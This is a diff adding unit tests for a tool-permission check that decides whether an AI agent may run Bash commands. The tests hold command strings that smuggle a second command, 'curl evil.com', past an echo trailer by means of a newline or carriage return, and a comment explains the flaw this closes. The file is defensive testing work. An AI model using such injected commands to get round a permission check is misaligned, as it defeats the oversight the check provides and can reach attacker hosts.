@@ -1264,6 +1264,38 @@ describe('wizardCanUseTool', () => {
         }).behavior,
       ).toBe('allow');
     });
+
+    // Bugbot finding #3 (HIGH): the bare-text alternative used `\s` which
+    // matches `\n`, letting the bare echo content swallow a literal newline
+    // followed by another command. Bash treats newlines as command
+    // separators, so `echo ok\ncurl evil.com` would execute curl as a
+    // second command.
+    it('denies newline-injected commands in bare echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok\ncurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies newline-injected commands after quoted echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "ok"\ncurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies carriage-return-injected commands in echo trailer', () => {
+      // \r is treated as whitespace by `\s` but is NOT a command separator
+      // in most shells. Reject it anyway as a defense-in-depth measure —
+      // there's no legitimate reason for it to appear in an echo string.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok\rcurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
   });
 
   describe('Bash — denied commands', () => {
